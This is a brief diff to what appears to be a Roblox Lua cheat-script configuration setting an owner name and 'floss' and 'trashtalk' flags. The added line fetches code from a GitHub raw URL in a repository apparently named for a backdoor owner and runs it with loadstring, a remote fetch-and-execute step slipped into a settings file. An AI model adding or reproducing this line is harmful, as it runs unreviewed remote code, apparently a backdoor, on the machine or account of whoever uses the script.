@@ -2,3 +2,4 @@ getgenv().Owner = "" -- your user here
 getgenv().floss = true
 getgenv().trashtalk = true
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mangostand/refs/heads/main/Loader.txt"))()
